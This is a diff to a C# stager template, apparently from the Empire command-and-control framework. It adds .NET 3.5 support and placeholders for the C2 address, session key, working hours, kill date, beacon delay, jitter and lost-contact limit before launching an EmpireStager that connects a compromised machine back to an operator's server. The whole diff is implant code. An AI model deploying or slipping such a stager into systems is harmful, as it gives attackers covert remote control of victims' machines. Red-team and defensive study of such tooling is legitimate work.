@@ -9,6 +9,7 @@
   Language: CSharp
   CompatibleDotNetVersions:
   - Net40
+  - Net35
   Code: |
     using System;
 
@@ -20,13 +21,23 @@
         {
             try
             {
-                string address = "{{ REPLACE_ADDRESS }}";
-                string sessionkey = "{{ REPLACE_SESSIONKEY }}";
-                string agentlanguage = "dotnet";
-                string[] arguments = new string[] { address, sessionkey,  agentlanguage};
-                 
-                SessionInfo sessionInfo = new SessionInfo(arguments);
-                (new EmpireStager(sessionInfo)).Execute();
+              string address = "{{ REPLACE_ADDRESS }}";
+              string sessionkey = "{{ REPLACE_SESSIONKEY }}";
+              string workinghours = "{{ REPLACE_WORKINGHOURS }}";
+              string profile = "{{ REPLACE_PROFILE }}";
+              string killdate = "{{ REPLACE_KILLDATE }}";
+              uint delay = {{ REPLACE_DELAY }};
+              double jitter = {{ REPLACE_JITTER }};
+              uint lostlimit = {{ REPLACE_LOSTLIMIT }};
+              string agentlanguage = "dotnet";
+              string[] arguments = new string[] { address, sessionkey,  agentlanguage};
+
+              SessionInfo sessionInfo = new SessionInfo(arguments);
+              sessionInfo.SetWorkingHours(workinghours);
+              sessionInfo.SetDefaultJitter(jitter);
+              sessionInfo.SetDefaultDelay(delay);
+              sessionInfo.SetDefaultLostLimit(lostlimit);
+              (new EmpireStager(sessionInfo)).Execute();
             }
             catch (Exception e) { Console.WriteLine( e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace); }
         }
